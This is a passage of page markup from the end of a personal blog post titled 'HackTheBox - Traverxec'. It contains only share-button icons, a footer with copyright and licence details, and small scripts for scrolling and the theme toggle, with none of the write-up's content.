483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Traverxec on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftraverxec%2f&title=HackTheBox%20-%20Traverxec"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Traverxec on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftraverxec%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Traverxec on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Traverxec%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftraverxec%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Traverxec on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Traverxec&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftraverxec%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>